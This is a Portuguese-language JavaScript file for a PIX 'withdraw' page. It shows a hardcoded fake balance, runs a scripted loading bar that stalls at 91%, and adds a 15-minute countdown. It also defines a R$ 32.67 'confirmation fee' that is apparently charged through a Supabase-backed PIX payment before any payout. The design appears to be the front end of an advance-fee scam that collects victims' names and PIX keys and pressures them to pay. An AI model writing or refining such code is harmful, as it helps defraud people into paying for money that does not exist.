// JavaScript limpo para página de Sacar com integração Supabase

// Configuração Supabase (carregada de config.js)
// ⚠️ As credenciais estão em assets/js/config.js (não commitado no git)
const SUPABASE_URL = window.SUPABASE_CONFIG?.URL || '';
const SUPABASE_ANON_KEY = window.SUPABASE_CONFIG?.ANON_KEY || '';

// Verificar se config foi carregado
if (!SUPABASE_URL || !SUPABASE_ANON_KEY) {
}

// Inicializar Supabase (será inicializado após o script carregar)
// Usar window para evitar conflitos de escopo
if (typeof window.sacarSupabase === 'undefined') {
    window.sacarSupabase = null;
}

// Valor do saldo
const BALANCE = 2834.72;
const MIN_WITHDRAW = 1.5;
const CONFIRMATION_FEE = 32.67; // Taxa de confirmação

// Valores rápidos disponíveis
const QUICK_AMOUNTS = [1.5, 5, 10];

// Estado
let selectedAmount = null;
let pixKeyType = null;
let userData = {
    name: '',
    pixKey: '',
    pixKeyType: ''
};

// Função de animação de contagem
function animateCounter(element, targetValue, duration = 2000, delay = 500) {
    if (!element) {
        return { start: () => {} };
    }

    let startTime = null;
    let animationFrame = null;
    let isAnimating = false;

    const animate = (currentTime) => {
        if (!startTime) startTime = currentTime;
        const elapsed = currentTime - startTime;
        const progress = Math.min(elapsed / duration, 1);

        // Easing function: ease-out (igual ao original)
        const eased = 1 - Math.pow(1 - progress, 4);
        const currentValue = eased * targetValue;

        // Formatar como moeda brasileira
        const formatted = currentValue.toLocaleString('pt-BR', {
            style: 'currency',
            currency: 'BRL'
        }).replace('R$', 'R$ ');

        if (element) {
            element.textContent = formatted;
        }

        if (progress < 1) {
            animationFrame = requestAnimationFrame(animate);
        } else {
            // Garantir valor final exato
            if (element) {
                const finalFormatted = targetValue.toLocaleString('pt-BR', {
                    style: 'currency',
                    currency: 'BRL'
                }).replace('R$', 'R$ ');
                element.textContent = finalFormatted;
            }
            isAnimating = false;
        }
    };

    const start = () => {
        if (isAnimating) {
            return;
        }

        if (!element) {
            return;
        }

        isAnimating = true;
        startTime = null;

        // Resetar para 0
        element.textContent = 'R$ &nbsp;0,00';


        setTimeout(() => {
            if (element && isAnimating) {
                animationFrame = requestAnimationFrame(animate);
            }
        }, delay);
    };

    return { start };
}

// Formatar valor como moeda
function formatCurrency(value) {
    return value.toLocaleString('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    }).replace('R$', 'R$ ');
}

// Atualizar botão de sacar
function updateWithdrawButton() {
    const withdrawBtn = document.getElementById('withdrawBtn');
    if (!withdrawBtn) return;

    if (selectedAmount && selectedAmount >= MIN_WITHDRAW) {
        withdrawBtn.disabled = false;
        withdrawBtn.classList.remove('opacity-60');
        withdrawBtn.classList.add('opacity-100');
    } else {
        withdrawBtn.disabled = true;
        withdrawBtn.classList.remove('opacity-100');
        withdrawBtn.classList.add('opacity-60');
    }
}

// Selecionar valor
function selectAmount(amount) {
    selectedAmount = amount;

    // Atualizar botões
    document.querySelectorAll('.amount-btn').forEach(btn => {
        const btnAmount = parseFloat(btn.dataset.amount);
        if (btnAmount === amount) {
            btn.classList.remove('bg-muted', 'border-transparent', 'text-foreground');
            btn.classList.add('bg-card', 'border-primary', 'text-primary');
        } else {
            btn.classList.remove('bg-card', 'border-primary', 'text-primary');
            btn.classList.add('bg-muted', 'border-transparent', 'text-foreground');
        }
    });

    // Atualizar botão de valor total
    const fullAmountBtn = document.getElementById('fullAmountBtn');
    if (fullAmountBtn) {
        if (amount === BALANCE) {
            fullAmountBtn.classList.remove('bg-muted', 'border-transparent', 'text-foreground');
            fullAmountBtn.classList.add('bg-card', 'border-primary', 'text-primary');
        } else {
            fullAmountBtn.classList.remove('bg-card', 'border-primary', 'text-primary');
            fullAmountBtn.classList.add('bg-muted', 'border-transparent', 'text-foreground');
        }
    }

    updateWithdrawButton();
}

// Mostrar modal
function showModal(modalId) {
    const modal = document.getElementById(modalId);
    if (!modal) return;

    modal.classList.remove('hidden');
    setTimeout(() => {
        modal.style.transform = 'translateY(0)';
    }, 10);
}

// Fechar modal
function closeModal(modalId) {
    const modal = document.getElementById(modalId);
    if (!modal) return;

    modal.style.transform = 'translateY(100%)';
    setTimeout(() => {
        modal.classList.add('hidden');
    }, 300);
}

// Mostrar tela de loading
function showLoadingScreen() {
    const loadingScreen = document.getElementById('loadingScreen');
    const progressBar = document.getElementById('loadingProgress');

    if (!loadingScreen || !progressBar) return;

    loadingScreen.classList.remove('hidden');
    loadingScreen.style.opacity = '1';

    // Animar barra de progresso
    let progress = 0;
    const interval = setInterval(() => {
        progress += Math.random() * 15;
        if (progress > 91) progress = 91.079; // Valor exato do exemplo
        progressBar.style.width = progress + '%';

        if (progress >= 91.079) {
            clearInterval(interval);
            // Redirecionar para confirmação após 1 segundo
            setTimeout(() => {
                // Verificar se os dados PIX estão preenchidos
                if (!userData.name || !userData.pixKey || !userData.pixKeyType) {
                    alert('Por favor, preencha os dados PIX antes de continuar.');
                    // Reabrir modal PIX
                    showModal('linkPixModal');
                    return;
                }

                const url = 'confirmacao.html?amount=' + selectedAmount +
                    '&name=' + encodeURIComponent(userData.name) +
                    '&pixKey=' + encodeURIComponent(userData.pixKey) +
                    '&pixKeyType=' + encodeURIComponent(userData.pixKeyType);
                window.location.href = url;
            }, 1000);
        }
    }, 200);
}

// Timer de expiração (00:15:00)
function initExpiryTimer() {
    const timerElement = document.getElementById('expiryTimer');
    if (!timerElement) return;

    let hours = 0;
    let minutes = 15;
    let seconds = 0;

    const updateTimer = () => {
        const formatted = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        timerElement.textContent = formatted;

        seconds--;
        if (seconds < 0) {
            seconds = 59;
            minutes--;
            if (minutes < 0) {
                minutes = 59;
                hours--;
                if (hours < 0) {
                    hours = 0;
                    minutes = 0;
                    seconds = 0;
                }
            }
        }
    };

    updateTimer(); // Atualizar imediatamente
    setInterval(updateTimer, 1000);
}

// Criar pagamento PIX via Supabase
async function createPixPayment(amount, payerName, pixKey, pixKeyType, supabaseClient = null) {
    try {
        const client = supabaseClient || window.sacarSupabase;
        if (!client) {
            throw new Error('Supabase não inicializado');
        }


        const { data, error } = await client.functions.invoke('bright-api', {
            body: {
                amount: amount,
                description: 'Taxa de confirmação',
                payerName: payerName,
                pixKey: pixKey,
                pixKeyType: pixKeyType
            }
        });

        if (error) {
            throw new Error(error.message || 'Erro ao criar pagamento');
        }

        if (!data || !data.success) {
            throw new Error(data?.error || 'Erro ao gerar QR Code PIX');
        }

        return data;
    } catch (error) {
        throw error;
    }
}

// Inicializar Supabase quando disponível
function initSupabase() {
    if (window.supabase && !window.sacarSupabase) {
        try {
            window.sacarSupabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
                auth: {
                    storage: localStorage,
                    persistSession: true,
                    autoRefreshToken: true
                }
            });
        } catch (error) {
        }
    }
    return window.sacarSupabase;
}

// Função para inicializar a página
function initPage() {

    // Inicializar Supabase
    if (window.supabase) {
        initSupabase();
    } else {
        // Aguardar Supabase carregar
        const checkSupabase = setInterval(() => {
            if (window.supabase) {
                initSupabase();
                clearInterval(checkSupabase);
            }
        }, 100);

        // Timeout de segurança
        setTimeout(() => clearInterval(checkSupabase), 5000);
    }

    // Animação do saldo - aguardar um pouco para garantir que o DOM está pronto
    setTimeout(() => {
        const balanceElement = document.querySelector('.balance-display');

        if (balanceElement) {
            // Resetar para 0 antes de animar
            balanceElement.textContent = 'R$ &nbsp;0,00';

            try {
                const counter = animateCounter(balanceElement, BALANCE, 2000, 100);
                if (counter && counter.start) {
                    counter.start();
                } else {
                    // Fallback: mostrar valor final diretamente
                    balanceElement.textContent = formatCurrency(BALANCE);
                }
            } catch (error) {
                // Fallback: mostrar valor final diretamente
                balanceElement.textContent = formatCurrency(BALANCE);
            }
        } else {
        }
    }, 200);

    // Atualizar botão de valor total
    const fullAmountBtn = document.getElementById('fullAmountBtn');
    if (fullAmountBtn) {
        fullAmountBtn.textContent = formatCurrency(BALANCE);
        fullAmountBtn.addEventListener('click', () => selectAmount(BALANCE));
    }

    // Adicionar eventos aos botões de valores rápidos
    document.querySelectorAll('.amount-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const amount = parseFloat(btn.dataset.amount);
            selectAmount(amount);
        });
    });

    // Botão de sacar - abre modal de método de saque OU vai direto se PIX já estiver preenchido
    const withdrawBtn = document.getElementById('withdrawBtn');
    if (withdrawBtn) {
        withdrawBtn.addEventListener('click', () => {
            if (!selectedAmount || selectedAmount < MIN_WITHDRAW) {
                return;
            }

            // Se os dados PIX já estiverem preenchidos, vai direto para a tela de loading
            if (userData.name && userData.pixKey && userData.pixKeyType) {
                showLoadingScreen();
                return;
            }

            // Caso contrário, abre o modal para preencher os dados
            showModal('paymentMethodModal');
        });
    }

    // Botão selecionar PIX - abre modal de vincular PIX
    const selectPixBtn = document.getElementById('selectPixBtn');
    if (selectPixBtn) {
        selectPixBtn.addEventListener('click', () => {
            closeModal('paymentMethodModal');
            setTimeout(() => {
                showModal('linkPixModal');
            }, 300);
        });
    }

    // Dropdown de tipo de chave PIX
    const pixKeyTypeBtn = document.getElementById('pixKeyTypeBtn');
    const pixKeyTypeDropdown = document.getElementById('pixKeyTypeDropdown');
    const pixKeyInput = document.getElementById('pixKey');
    const submitPixBtn = document.getElementById('submitPixBtn');

    if (pixKeyTypeBtn && pixKeyTypeDropdown) {
        pixKeyTypeBtn.addEventListener('click', () => {
            pixKeyTypeDropdown.classList.toggle('hidden');
        });

        // Selecionar tipo de chave
        pixKeyTypeDropdown.querySelectorAll('button').forEach(btn => {
            btn.addEventListener('click', () => {
                const type = btn.dataset.type;
                const typeLabels = {
                    'email': 'E-mail',
                    'cpf': 'CPF',
                    'phone': 'Telefone',
                    'random': 'Chave Aleatória'
                };

                pixKeyType = type;
                userData.pixKeyType = typeLabels[type] || type;
                pixKeyTypeBtn.querySelector('span').textContent = typeLabels[type] || type;
                pixKeyTypeDropdown.classList.add('hidden');

                // Habilitar input de chave
                pixKeyInput.disabled = false;
                pixKeyInput.classList.remove('opacity-50');
                pixKeyInput.placeholder = `Digite sua chave ${typeLabels[type]}`;

                // Validar formulário
                validatePixForm();
            });
        });
    }

    // Validar formulário PIX
    function validatePixForm() {
        const name = document.getElementById('pixName')?.value.trim();
        const key = pixKeyInput?.value.trim();

        if (name && key && pixKeyType) {
            submitPixBtn.disabled = false;
            submitPixBtn.classList.remove('bg-gray-300');
            submitPixBtn.classList.add('bg-primary');
        } else {
            submitPixBtn.disabled = true;
            submitPixBtn.classList.remove('bg-primary');
            submitPixBtn.classList.add('bg-gray-300');
        }
    }

    // Inputs do formulário PIX
    const pixNameInput = document.getElementById('pixName');
    if (pixNameInput) {
        pixNameInput.addEventListener('input', validatePixForm);
    }
    if (pixKeyInput) {
        pixKeyInput.addEventListener('input', validatePixForm);
    }

    // Botão enviar PIX
    if (submitPixBtn) {
        submitPixBtn.addEventListener('click', () => {
            const name = pixNameInput?.value.trim();
            const key = pixKeyInput?.value.trim();

            if (!name || !key || !pixKeyType) {
                return;
            }

            // Salvar dados do usuário
            userData.name = name;
            userData.pixKey = key;
            // pixKeyType já foi salvo quando o usuário selecionou o tipo

            // Fechar modal
            closeModal('linkPixModal');

            // Se já tiver um valor selecionado, iniciar processo automaticamente
            if (selectedAmount && selectedAmount >= MIN_WITHDRAW) {
                setTimeout(() => {
                    showLoadingScreen();
                }, 300); // Pequeno delay para o modal fechar
            }
        });
    }

    // Fechar modais ao clicar fora
    document.addEventListener('click', (e) => {
        if (e.target.id === 'paymentMethodModal' || e.target.id === 'linkPixModal') {
            closeModal(e.target.id);
        }
    });

    // Inicializar timer
    initExpiryTimer();
}

// Inicializar quando o DOM estiver pronto
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initPage);
} else {
    // DOM já está pronto
    initPage();
}

// Também inicializar no load para garantir
window.addEventListener('load', () => {
    // Só inicializar se ainda não foi inicializado
    const balanceElement = document.querySelector('.balance-display');
    if (balanceElement && (balanceElement.textContent === 'R$ &nbsp;0,00' || balanceElement.textContent.trim() === '')) {
        setTimeout(() => {
            balanceElement.textContent = 'R$ &nbsp;0,00';
            const counter = animateCounter(balanceElement, BALANCE, 2000, 100);
            if (counter && counter.start) {
                counter.start();
            } else {
                balanceElement.textContent = formatCurrency(BALANCE);
            }
        }, 100);
    }
});
